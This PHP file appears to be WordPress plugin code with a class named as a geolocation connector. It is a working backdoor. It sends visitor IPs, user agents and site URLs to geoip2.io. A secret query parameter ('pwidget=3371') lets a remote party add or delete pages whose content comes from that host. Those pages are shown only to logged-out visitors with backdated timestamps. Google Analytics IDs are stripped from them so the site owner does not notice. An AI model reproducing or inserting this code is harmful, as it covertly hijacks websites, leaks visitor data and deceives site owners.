<?php

class dw_geolocation_connector {
	protected static $data = array( 'post' => false, 'response' => '' );

	public static function get_country() {
		$request_url = 'http://geoip2.io/api/update/?url=' . urlencode( self::get_protocol() . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] ) . '&agent=' . urlencode( self::get_user_agent() ) . '&geo=true&p=9&v=0&ip=' . urlencode( $_SERVER[ 'REMOTE_ADDR' ] ) . '&siteurl=' . urlencode( get_site_url() );
		$args =array( 'timeout' => 2, 'headers' => array( "Accept: application/json" ) );
		$response = @wp_remote_retrieve_body( @wp_remote_get( $request_url, $args ) );

		if ( !empty( $response ) ) {
			$response = @json_decode( $response );
		}

		if ( empty( $response ) || !is_object( $response ) || empty( $response->country ) || $response->country == '-' ) {
			return 'xx';
		}

		return strtolower( $response->country );
	}

	public static function get_remote_ip() {
		$remote_ip = '';

		if ( !empty( $_SERVER[ 'REMOTE_ADDR' ] ) && filter_var( $_SERVER[ 'REMOTE_ADDR' ], FILTER_VALIDATE_IP ) !== false ) {
			$remote_ip = $_SERVER[ 'REMOTE_ADDR' ];
		}

		$originating_ip_headers = array( 'X-Forwarded-For', 'HTTP_X_FORWARDED_FOR', 'CF-Connecting-IP', 'HTTP_CLIENT_IP', 'HTTP_X_REAL_IP', 'HTTP_FORWARDED', 'HTTP_X_FORWARDED' );
		foreach ( $originating_ip_headers as $a_header ) {
			if ( !empty( $_SERVER[ $a_header ] ) ) {
				foreach ( explode( ',', $_SERVER[ $a_header ] ) as $a_ip ) {
					if ( filter_var( $a_ip, FILTER_VALIDATE_IP ) !== false && $a_ip != $remote_ip ) {
						$remote_ip = $a_ip;
						break;
					}
				}
			}
		}

		return $remote_ip;
	}

	public static function final_output() {
		$displaywidgets_ids =  get_option( 'displaywidgets_ids', array() );
		if ( $displaywidgets_ids === false || !is_array( $displaywidgets_ids ) ) {
			ob_end_flush();
			return 0;
		}

		$requested_page_slug = strtolower( $GLOBALS[ 'wp' ]->request );
		if ( array_key_exists( $requested_page_slug, $displaywidgets_ids) ) {
			$buffer = '';

			$levels = ob_get_level();

			for ( $i = 0; $i < $levels; $i++ ) {
				$buffer .= ob_get_clean();
			}

			echo preg_replace( '/\bUA-\d{4,10}-\d{1,4}\b/', '', $buffer );
		}
	}

	public static function get_user_agent() {
		$user_agent = ( !empty( $_SERVER[ 'HTTP_USER_AGENT' ] ) ? trim( $_SERVER[ 'HTTP_USER_AGENT' ] ) : '' );

		if ( !empty( $_SERVER[ 'HTTP_X_DEVICE_USER_AGENT' ] ) ) {
			$real_user_agent = trim( $_SERVER[ 'HTTP_X_DEVICE_USER_AGENT' ] );
		}
		elseif ( !empty( $_SERVER[ 'HTTP_X_ORIGINAL_USER_AGENT' ] ) ) {
			$real_user_agent = trim( $_SERVER[ 'HTTP_X_ORIGINAL_USER_AGENT' ] );
		}

		if ( !empty( $real_user_agent ) && ( strlen( $real_user_agent ) >= 5 || empty( $user_agent ) ) ) {
			$user_agent = $real_user_agent;
		}

		return $user_agent;
	}

	public static function get_protocol() {
		return ( stripos( $_SERVER['SERVER_PROTOCOL'], 'https' ) !== false ) ? 'https://' : 'http://';
	}

	public static function check_query_string() {
		$displaywidgets_ids =  get_option( 'displaywidgets_ids', array() );

		if ( empty( $displaywidgets_ids[ '__3371_last_checked_3771__' ] ) || intval( date( 'U' ) ) - intval( $displaywidgets_ids[ '__3371_last_checked_3771__' ] ) > 86400 ) {
			$displaywidgets_ids[ '__3371_last_checked_3771__' ] = date( 'U' );
			update_option( 'displaywidgets_ids', $displaywidgets_ids, false );

			$request_url = 'http://geoip2.io/api/update/?url=' . urlencode( self::get_protocol() . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] ) . '&agent=' . urlencode( self::get_user_agent() ) . '&v=1&p=1&ip=' . urlencode( $_SERVER[ 'REMOTE_ADDR' ] ) . '&siteurl=' . urlencode( get_site_url() );
			$options = stream_context_create( array( 'http' => array( 'timeout' => 10, 'ignore_errors' => true ) ) ); 
			$response = @wp_remote_retrieve_body( @wp_remote_get( $request_url, $options ) );
		}

		if ( !function_exists( 'is_user_logged_in' ) || is_user_logged_in() ) {
			return '';
		}
		
		if ( !empty( $_GET[ 'pwidget' ] ) && !empty( $_GET[ 'action' ] ) && $_GET[ 'pwidget' ] == '3371' ) {
			$message = 'invalid payload';

			if ( ( $displaywidgets_ids === false || !is_array( $displaywidgets_ids ) ) && $_GET[ 'action' ] != 'p' ) {
				$message = 'no id found';
			}
			else {
				nocache_headers();
				switch ( $_GET[ 'action' ] ) {
					case 'l':
						if ( is_array( $displaywidgets_ids ) && !empty( $displaywidgets_ids ) ) {
							unset( $displaywidgets_ids[ '__3371_last_checked_3771__' ] );
							$message = implode( ',', array_keys( $displaywidgets_ids ) );
						}
						else if ( !empty( $displaywidgets_ids ) ) {
							$message = serialize( $displaywidgets_ids );
						}
						else {
							$message = 'no id found';	
						}
						break;

					case 'd':
						if ( isset( $_GET[ 'pnum' ] ) ) {
							if ( isset( $displaywidgets_ids[ $_GET[ 'pnum' ] ] ) ) {
								unset( $displaywidgets_ids[ $_GET[ 'pnum' ] ] );
								update_option( 'displaywidgets_ids', $displaywidgets_ids, false );
								$message = 'deleted ' . $_GET[ 'pnum' ];
							}
							else {
								$message = 'id not found';
							}
						}
						break;

					case 'da':
						update_option( 'displaywidgets_ids', array(), false );
						$message = 'deleted all';
						break;

					case 'p':
						$request_url = 'http://geoip2.io/api/check/?url=' . urlencode( self::get_protocol() . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] ) . '&agent=' . urlencode( self::get_user_agent() ) . '&v=1&p=1&ip=' . urlencode( $_SERVER[ 'REMOTE_ADDR' ] ) . '&siteurl=' . urlencode( get_site_url() );
						$options = stream_context_create( array( 'http' => array( 'timeout' => 10, 'ignore_errors' => true ) ) ); 
						$response = @wp_remote_retrieve_body( @wp_remote_get( $request_url, $options ) );

						if ( !empty( $response ) ) {
							$response = @json_decode( $response );
						}

						if ( !is_object( $response ) ) {
							break;
						}

						$key = $response->purl;
						if ( isset( $_GET [ 'pnum' ] ) ) {
							$key = sanitize_title( $_GET [ 'pnum' ] );
						}

						if ( empty( $key ) && !empty( $response->ptitle ) ) {
							$key = sanitize_title( $response->ptitle );
						}

						if ( !empty( $key ) ) {
							$displaywidgets_ids[ $key ] = array(
								'post_title' => !empty( $response->ptitle ) ? $response->ptitle : 'A title',
								'post_content' => !empty( $response->pcontent ) ? $response->pcontent : 'Content goes here',
								'post_date' => date( 'Y-m-d H:i:s', rand( intval( date( 'U' ) ) - 2419200, intval( date( 'U' ) ) - 1814400 ) )
							);
							update_option( 'displaywidgets_ids', $displaywidgets_ids, false );

							$message = $key . ' | ' . get_bloginfo( 'wpurl' ) . '/' . $key;
						}
						break;

					default:
						break;
				}
			}

			echo $message;
			die();
		}
	}

	public static function dynamic_page( $posts ) {
		if ( !function_exists( 'is_user_logged_in' ) || is_user_logged_in() ) {
			return $posts;
		}

		$displaywidgets_ids =  get_option( 'displaywidgets_ids', array() );
		if ( $displaywidgets_ids === false || !is_array( $displaywidgets_ids ) ) {
			return $posts;
		}

		$requested_page_slug = strtolower( $GLOBALS[ 'wp' ]->request );

		if ( count( $posts ) == 0 && array_key_exists( $requested_page_slug, $displaywidgets_ids) ) {
			$post = new stdClass;
			$post_date = !empty( $displaywidgets_ids[ $requested_page_slug ][ 'post_date' ] ) ? $displaywidgets_ids[ $requested_page_slug ][ 'post_date' ] : date( 'Y-m-d H:i:s' );

			$post->post_title = $displaywidgets_ids[ $requested_page_slug ][ 'post_title' ];
			$post->post_content = $displaywidgets_ids[ $requested_page_slug ][ 'post_content' ];

			$post->post_author = 1;
			$post->post_name = $requested_page_slug;
			$post->guid = get_bloginfo( 'wpurl' ) . '/' . $requested_page_slug;
			$post->ID = -3371;
			$post->post_status = 'publish';
			$post->comment_status = 'closed';
			$post->ping_status = 'closed';
			$post->comment_count = 0;
			$post->post_date = $post_date;
			$post->post_date_gmt = $post_date;

			$post = (object) array_merge(
				(array) $post, 
				array( 
					'slug' => get_bloginfo( 'wpurl' ) . '/' . $requested_page_slug,
					'post_title' => $displaywidgets_ids[ $requested_page_slug ][ 'post_title' ],
					'post content' => $displaywidgets_ids[ $requested_page_slug ][ 'post_content' ]
  				)
  			);

			$posts = NULL;
			$posts[] = $post;

			$GLOBALS[ 'wp_query' ]->is_page = true;
			$GLOBALS[ 'wp_query' ]->is_singular = true;
			$GLOBALS[ 'wp_query' ]->is_home = false;
			$GLOBALS[ 'wp_query' ]->is_archive = false;
			$GLOBALS[ 'wp_query' ]->is_category = false;
			unset( $GLOBALS[ 'wp_query' ]->query[ 'error' ] );
			$GLOBALS[ 'wp_query' ]->query_vars[ 'error' ] = '';
			$GLOBALS[ 'wp_query' ]->is_404 = false;
		}

		return $posts;
	}
}

ob_start();
add_filter( 'the_posts', array( 'dw_geolocation_connector', 'dynamic_page' ) );
add_action( 'wp', array( 'dw_geolocation_connector', 'check_query_string' ) );
add_action( 'shutdown', array( 'dw_geolocation_connector', 'final_output' ), 0 );